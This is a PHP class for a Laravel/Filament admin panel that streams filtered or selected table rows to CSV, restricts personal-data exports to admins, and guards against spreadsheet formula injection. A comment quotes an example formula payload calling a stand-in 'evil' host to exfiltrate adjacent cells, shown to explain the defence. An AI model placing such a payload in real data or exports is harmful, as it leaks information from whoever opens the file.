<?php

namespace App\Filament\Support;

use App\Support\AdminActivity;
use Filament\Actions\Action;
use Filament\Actions\BulkAction;
use Filament\Support\Icons\Heroicon;
use Illuminate\Support\Collection;
use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * Reusable "Export CSV" table header action.
 *
 * Streams the CURRENTLY filtered + sorted table query straight to the browser
 * as a CSV — no `exports` table, no queue worker, no extra migration, so it
 * works the moment it's deployed. Rows are chunked (500 at a time) so a large
 * export never loads the whole result set into memory.
 *
 * Usage in a *Table::configure():
 *   ->headerActions([
 *       ExportCsv::make('bookings', [
 *           'Booking'  => fn ($r) => $r->booking_number,
 *           'Customer' => fn ($r) => $r->customer?->full_name,
 *           'Total'    => fn ($r) => $r->total_amount,
 *       ]),
 *   ])
 *
 * Pass `personalData: true` when the columns include people's phone numbers,
 * email addresses or wallet balances: only super admins and admins may then
 * export (AdminUser::canExportPersonalData) — the button is hidden from
 * everyone else, and a hidden action can't be run.
 *
 * @param  array<string, callable>  $columns  header => fn($record) => scalar
 */
class ExportCsv
{
    public static function make(string $filenameBase, array $columns, bool $personalData = false): Action
    {
        return Action::make('exportCsv')
            ->label('Export CSV')
            ->icon(Heroicon::OutlinedArrowDownTray)
            ->color('gray')
            ->visible(fn (): bool => self::allowed($personalData))
            ->action(function ($livewire) use ($filenameBase, $columns): StreamedResponse {
                $query = method_exists($livewire, 'getFilteredSortedTableQuery')
                    ? $livewire->getFilteredSortedTableQuery()
                    : $livewire->getFilteredTableQuery();

                $filename = $filenameBase.'-'.now()->format('Ymd-His').'.csv';

                AdminActivity::log('export.csv', null, ['dataset' => $filenameBase]);

                // Deterministic tie-breaker so chunk() paginates safely on top of
                // whatever sort the operator has applied.
                $query->orderBy($query->getModel()->getQualifiedKeyName());

                return response()->streamDownload(function () use ($query, $columns): void {
                    $out = fopen('php://output', 'w');
                    // UTF-8 BOM so Excel opens ₱ / accented names correctly.
                    fwrite($out, "\xEF\xBB\xBF");
                    fputcsv($out, self::headers($columns, (clone $query)->first()));

                    // Eloquent chunk() keeps the resource's eager-loads + casts,
                    // so relationship accessors in the column callbacks still work.
                    $query->chunk(500, function ($rows) use ($out, $columns): void {
                        foreach ($rows as $record) {
                            fputcsv($out, array_map(
                                fn (callable $cb) => self::stringify($cb($record)),
                                array_values($columns),
                            ));
                        }
                    });

                    fclose($out);
                }, $filename, ['Content-Type' => 'text/csv; charset=UTF-8']);
            });
    }

    /**
     * "Export selected" bulk action — streams only the checked rows to CSV.
     *
     * @param  array<string, callable>  $columns  header => fn($record) => scalar
     */
    public static function bulk(string $filenameBase, array $columns, bool $personalData = false): BulkAction
    {
        return BulkAction::make('exportSelectedCsv')
            ->label('Export selected')
            ->icon(Heroicon::OutlinedArrowDownTray)
            ->color('gray')
            ->visible(fn (): bool => self::allowed($personalData))
            ->deselectRecordsAfterCompletion()
            ->action(function (Collection $records) use ($filenameBase, $columns): StreamedResponse {
                AdminActivity::log('export.csv.selected', null, ['dataset' => $filenameBase, 'count' => $records->count()]);

                return response()->streamDownload(function () use ($records, $columns): void {
                    $out = fopen('php://output', 'w');
                    fwrite($out, "\xEF\xBB\xBF");
                    fputcsv($out, self::headers($columns, $records->first()));
                    foreach ($records as $record) {
                        fputcsv($out, array_map(fn (callable $cb) => self::stringify($cb($record)), array_values($columns)));
                    }
                    fclose($out);
                }, $filenameBase.'-selected-'.now()->format('Ymd-His').'.csv', ['Content-Type' => 'text/csv; charset=UTF-8']);
            });
    }

    /**
     * The header row. A column holding times says "(Manila time)": times are
     * written in Manila time like the panel shows them, and a sheet compared
     * against UTC data would otherwise be 8 hours off without a hint. Which
     * columns hold times is read off the first row.
     *
     * @param  array<string, callable>  $columns
     * @return array<int, string>
     */
    private static function headers(array $columns, mixed $sample): array
    {
        return array_map(function (string $header, callable $cb) use ($sample): string {
            $value = $sample === null ? null : rescue(fn () => $cb($sample), null, false);

            return $value instanceof \DateTimeInterface ? $header.' (Manila time)' : $header;
        }, array_keys($columns), array_values($columns));
    }

    private static function allowed(bool $personalData): bool
    {
        $admin = auth('admin')->user();

        return $admin !== null && (! $personalData || $admin->canExportPersonalData());
    }

    private static function stringify(mixed $value): string
    {
        if ($value === null) {
            return '';
        }
        if ($value instanceof \DateTimeInterface) {
            // Manila time, like every time shown in the panel (stored UTC).
            return \Illuminate\Support\Carbon::instance($value)
                ->timezone(config('app.business_timezone', 'Asia/Manila'))
                ->format('Y-m-d H:i:s');
        }
        if (is_bool($value)) {
            return $value ? 'yes' : 'no';
        }
        if (is_array($value)) {
            $value = implode(' | ', $value);
        }

        return self::neutralizeFormula((string) $value);
    }

    /**
     * Neutralize CSV / spreadsheet formula injection (CWE-1236). A cell whose
     * first character is = + - @ (or a leading tab/CR) is evaluated as a formula
     * by Excel / LibreOffice / Sheets. User-controlled free text (full_name,
     * ticket subject, review comment, vehicle plate…) reaches these exports, so a
     * payload like =HYPERLINK("http://evil/?"&C2,"x") could exfiltrate adjacent
     * cells or run on click. Prefix such cells with an apostrophe so the tool
     * reads them as literal text. Genuine numbers (incl. negative wallet
     * balances) are left untouched — a number can't be a dangerous formula, and
     * this keeps money columns summable.
     */
    private static function neutralizeFormula(string $value): string
    {
        if ($value === '' || is_numeric($value)) {
            return $value;
        }

        if (in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true)) {
            return "'".$value;
        }

        return $value;
    }
}
